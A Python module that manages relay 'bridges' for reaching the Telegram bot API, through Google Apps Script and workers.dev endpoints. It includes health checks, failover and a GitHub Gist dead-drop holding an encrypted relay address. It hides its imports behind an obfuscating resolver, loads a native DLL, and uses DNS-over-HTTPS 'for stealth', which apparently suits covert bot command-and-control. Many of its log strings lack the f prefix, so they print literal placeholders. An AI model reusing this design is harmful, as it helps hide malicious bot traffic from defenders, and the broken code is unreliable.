"""
core/bridge_manager.py — Advanced Telegram Bridge Manager (GAS-only)
Features:
- Multiple bridge failover (Google Apps Script)
- Health checking and auto-switching
- Direct connection fallback check
"""

from core.resolver import Resolver, _OS, _TIME, _JSON, _BASE64, _RANDOM, _THREADING, _REQUESTS, _SUBPROCESS, _DATETIME, _TYPING
os = Resolver.get_mod(_OS)
time = Resolver.get_mod(_TIME)
json = Resolver.get_mod(_JSON)
base64 = Resolver.get_mod(_BASE64)
random = Resolver.get_mod(_RANDOM)
threading = Resolver.get_mod(_THREADING)
requests = Resolver.get_mod(_REQUESTS)
subprocess = Resolver.get_mod(_SUBPROCESS)
datetime = Resolver.get_mod(_DATETIME)
Any, Dict, List, Optional, Union = Resolver.get_mod(_TYPING).Any, Resolver.get_mod(_TYPING).Dict, Resolver.get_mod(_TYPING).List, Resolver.get_mod(_TYPING).Optional, Resolver.get_mod(_TYPING).Union
# No legacy decrypt_string needed
from core.error_logger import error_logger

try:
    import clr
    CLR_AVAILABLE = True
except ImportError:
    CLR_AVAILABLE = False

class BridgeNative:
    _manager = None

    @classmethod
    def get_manager(cls):
        if cls._manager is None and CLR_AVAILABLE:
            try:
                project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
                dll_path = os.path.join(project_root, "defense", "bridge.dll")
                if os.path.exists(dll_path):
                    clr.AddReference(dll_path)
                    Resolver.load_native()
                    from VanguardCore import BridgeManager as NativeBridge
                    cls._manager = NativeBridge
            except: pass
        return cls._manager

class BridgeConfig:
    """Configuration for bridges"""

    FALLBACK_VPS = []

import logging
from core.config import ConfigManager

class BridgeManager:
    """Manages P2P proxy bridges via GitHub Gist and Bore"""
    
    def __init__(self):
        self._gist_id = ConfigManager.get("GIST_PROXY_ID", "")
        self._gist_token = ConfigManager.get("GIST_GITHUB_TOKEN", "")
        self._current_proxy = None
        self.bridge_stats = {}
        self.db_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "assets", "bridges.json")
        self.bridges: set[str] = set()
        self.current_index = 0
        self.bridge_active = False
        self.failed_attempts = 0
        self.max_failures = 3
        self.lock = threading.Lock()
        self.last_check: float = 0.0
        self.check_interval = 300

        self._load_bridges()

    def get_gist_proxy(self) -> Optional[str]:
        """Fetch active bridge address from Gist (C# optimized)"""
        if not self._gist_id: return None
        
        # 1. Try C# Native Networking (Stealthy + DoH)
        try:
            import clr
            Resolver.load_native()
            from VanguardCore import NetworkingManager
            data = NetworkingManager.GetGistData(self._gist_id, self._gist_token)
            if data:
                return data
        except:
            pass

        # 2. Fallback to Python DoH
        from core.dns_resolver import secure_resolver
        gist_url = f"https://api.github.com/gists/{self._gist_id}"
        url = secure_resolver.get_url_with_ip(gist_url)
        host = "api.github.com"
        
        try:
            headers = {"Accept": "application/vnd.github.v3+json", "Host": host}
            if self._gist_token:
                headers["Authorization"] = f"token {self._gist_token}"
                
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                files = response.json().get("files", {})
                for name, info in files.items():
                    if name == "proxi.json":
                        enc_data = info.get("content", "")
                        return Resolver.decrypt(enc_data)
        except Exception as e:
            logging.error(f"BridgeManager: Failed to fetch Gist proxy: {e}")
        return None

    def update_gist_proxy(self, proxy_addr: str) -> bool:
        """Upload active bridge address to Gist (Bridge Nodes only)"""
        if not self._gist_id or not self._gist_token: return False
        
        # Note: NetworkingManager doesn't have PatchAsync implemented yet in C# for simplicity,
        # so we'll stick to Python for the update part (which is only done by Bridge Nodes).
        # However, we'll still use DoH for stealth.
        
        from core.dns_resolver import secure_resolver
        gist_url = f"https://api.github.com/gists/{self._gist_id}"
        url = secure_resolver.get_url_with_ip(gist_url)
        host = "api.github.com"
        
        try:
            payload = {
                "files": {
                    "proxi.json": {"content": proxy_addr}
                }
            }
            headers = {
                "Authorization": f"token {self._gist_token}",
                "Accept": "application/vnd.github.v3+json",
                "Host": host
            }
            response = requests.patch(url, json=payload, headers=headers, timeout=10)
            return response.status_code == 200
        except Exception as e:
            logging.error(f"BridgeManager: Failed to update Gist proxy: {e}")
        return False

    def _save(self):
        """Save bridges to local JSON with encryption"""
        try:
            os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
            with open(self.db_path, 'w') as f:
                json.dump(list(self.bridges), f)
        except Exception as e:
            error_logger.log(__name__, "Failed to save bridges: {e}")

    def _load_bridges(self):
        """Load and decrypt bridges from local file and fallback"""

        if os.path.exists(self.db_path):
            try:
                with open(self.db_path, 'r') as f:
                    data = json.load(f)
                    if isinstance(data, list):
                        for b in data:
                            self.bridges.add(b)
            except: pass

        for vps in BridgeConfig.FALLBACK_VPS:
            self.bridges.add(vps)

        self._save()

    # Auto-deploy removed

    def cleanup_dead_bridges(self):
        """Remove bridges that fail the health check"""
        removed = 0
        with self.lock:

            new_set = set()
            for b in self.bridges:
                if "workers.dev" in b:
                    print("[Bridge] Testing {b} for cleanup...")
                    if self.test_bridge(b):
                        new_set.add(b)
                    else:
                        print("[Bridge] Removing dead bridge: {b}")
                        removed += 1
                else:
                    new_set.add(b)
            self.bridges = new_set
            self._save()
        return removed

    def clear_all_bridges(self):
        """Clear all bridge workers"""
        with self.lock:
            self.bridges = set(BridgeConfig.FALLBACK_VPS)
            self.current_index = 0
            self._save()
        return 0

    def get_current_bridge(self):
        """Get current active bridge URL"""
        with self.lock:
            if self.bridges:
                blist = sorted(list(self.bridges))
                return blist[self.current_index % len(blist)]
        return None

    def get_all_bridges(self):
        """Get all bridges"""
        with self.lock:
            return list(self.bridges)

    def test_all_bridges(self):
        "Test all bridges and return result dict {url: success}"
        results = {}
        bridges = self.get_all_bridges()
        for b in bridges:
            results[b] = self.test_bridge(b)
        return results

    def test_bridge(self, bridge_url):
        """Test if bridge is working with retries"""
        for attempt in range(3):
            try:
                # GAS bridges use ?path= parameter or path info
                is_gas = "script.google.com" in bridge_url
                
                if is_gas:
                    health_url = bridge_url + "?path=/health"
                else:
                    health_url = bridge_url.rstrip('/') + "/health"
                
                response = requests.get(
                    health_url,
                    timeout=8,
                    headers={'User-Agent': "Mozilla/5.0"}
                )

                if response.status_code == 200:
                    try:
                        data = response.json()
                        return data.get('status') == 'ok' or (is_gas and "ok" in str(data))
                    except:
                        return True
                else:
                    print("[Bridge] Health check for {health_url} returned {response.status_code}")

                    if is_gas:
                        test_tg_url = bridge_url + "?path=/bot123/getMe"
                    else:
                        test_tg_url = bridge_url.rstrip('/') + "/bot123/getMe"
                        
                    response = requests.get(test_tg_url, timeout=8)

                    if response.status_code in [200, 302, 401]: # GAS may redirect
                        return True

            except Exception as e:
                print("[Bridge] Attempt {attempt+1} failed for {bridge_url}: {e}")
                if attempt < 2:
                    time.sleep(5)
                    continue
                error_logger.log(__name__, "Test failed for {bridge_url}: {e}")

        return False

    def test_direct_telegram(self):
        """Test direct connection to Telegram API"""
        try:
            response = requests.get(
                "https://api.telegram.org",
                timeout=3,
                headers={'User-Agent': "Mozilla/5.0"}
            )
            return response.status_code == 200
        except:
            return False

    def get_best_route(self):
        """Determine best route (direct or bridge)"""

        if self.test_direct_telegram():
            self.bridge_active = False
            return {
                'type': 'direct',
                'api_url': "https://api.telegram.org/bot{0}/{1}",
                'file_url': "https://api.telegram.org/file/bot{0}/{1}",
                'latency': 0
            }

        best_bridge = None
        best_latency = float('inf')

        for i, bridge in enumerate(self.bridges):
            try:
                start = time.time()
                if self.test_bridge(bridge):
                    latency = (time.time() - start) * 1000

                    self.bridge_stats[bridge] = {
                        'latency': latency,
                        'last_check': time.time(),
                        'success_rate': self.bridge_stats.get(bridge, {}).get('success_rate', 1.0)
                    }

                    if latency < best_latency:
                        best_latency = latency
                        best_bridge = bridge
                        self.current_index = i
            except:
                continue

        if best_bridge is not None:
            self.bridge_active = True
            is_gas = "script.google.com" in best_bridge
            
            if is_gas:
                api_url = best_bridge + "?path=/bot{0}/{1}"
                file_url = best_bridge + "?path=/file/bot{0}/{1}"
            else:
                api_url = best_bridge + "/bot{0}/{1}"
                file_url = best_bridge + "/file/bot{0}/{1}"
                
            return {
                'type': 'bridge',
                'api_url': api_url,
                'file_url': file_url,
                'bridge_url': best_bridge,
                'latency': best_latency
            }

        return None

    def report_failure(self):
        """Report a bridge failure and switch if needed"""
        with self.lock:
            self.failed_attempts += 1
            if self.failed_attempts >= self.max_failures:
                return self._switch_to_next()
        return False

    def _switch_to_next(self):
        """Switch to next available bridge"""
        old = self.current_index
        blist = sorted(list(self.bridges))
        old_bridge = blist[old] if old < len(blist) else None

        self.current_index = (self.current_index + 1) % len(blist) if blist else 0
        self.failed_attempts = 0

        new_bridge = blist[self.current_index] if blist else None

        error_logger.log(
            __name__,
            f"Bridge switched from {old_bridge} to {new_bridge}"
        )

        print("[Bridge] Switched to bridge {self.current_index}: {new_bridge}")
        return True

    def auto_switch_if_needed(self):
        """Periodically check and auto-switch if current bridge is dead"""
        now = time.time()
        if now - self.last_check < self.check_interval:
            return

        self.last_check = now

        if self.bridge_active and self.bridges:
            current = self.get_current_bridge()
            if current and not self.test_bridge(current):
                print("[Bridge] Current bridge {current} dead, switching...")
                self._switch_to_next()

    def get_stats(self):
        """Get bridge statistics"""
        bridge_list = []
        for b in self.bridges:
            stats = self.bridge_stats.get(b, {})

            if b not in self.bridge_stats:
                status = 'untested'
            elif stats.get('latency', 0) > 0:
                status = 'healthy'
                if time.time() - stats.get('last_check', 0) > 600:
                    status = 'stale'
            else:
                status = 'dead'

            bridge_list.append({
                'url': b,
                'latency': stats.get('latency', 0),
                'fails': stats.get('fails', 0),
                'status': status
            })

        return {
            'total_bridges': len(self.bridges),
            'active_bridge': self.get_current_bridge(),
            'bridge_active': self.bridge_active,
            'failed_attempts': self.failed_attempts,
            'current_index': self.current_index,
            'bridges': bridge_list
        }

    def force_deploy(self):
        """Dummy method for compatibility"""
        return self.get_current_bridge()

    def remove_dead_bridge(self, bridge_url):
        """Remove a dead bridge from list"""
        if bridge_url in self.bridges:
            self.bridges.remove(bridge_url)
            self._save()

            if self.current_index >= len(self.bridges):
                self.current_index = 0

            return True
        return False

bridge_manager = BridgeManager()
